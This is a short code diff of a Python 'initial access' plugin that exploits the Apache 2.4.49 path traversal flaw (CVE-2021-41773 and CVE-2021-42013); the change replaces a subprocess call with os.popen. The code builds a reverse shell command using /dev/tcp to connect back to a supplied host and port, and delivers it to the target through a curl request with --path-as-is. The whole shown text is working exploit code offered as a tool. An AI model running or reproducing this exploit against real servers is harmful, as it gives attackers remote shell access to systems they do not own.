@@ -1,7 +1,6 @@
 # [PLUGIN INITIAL ACCESS] Apache 2.4.49 RCE (CVE-2021-41773 et CVE-2021-42013)
 
 import requests
-import subprocess
 import os
 
 def exploit(ip_dest, port_dest, ip_src, port_src):
@@ -16,7 +15,7 @@ def exploit(ip_dest, port_dest, ip_src, port_src):
             return 'Error'
         rs = 'bash -c "/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1"'.format(ip_src, port_src)
         cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}'".format(rs, host, payload)
-        shell = subprocess.popen(cmd) # TODO: background the command to not block the script execution
+        os.popen(cmd)
         return True
         
     except Exception as e:
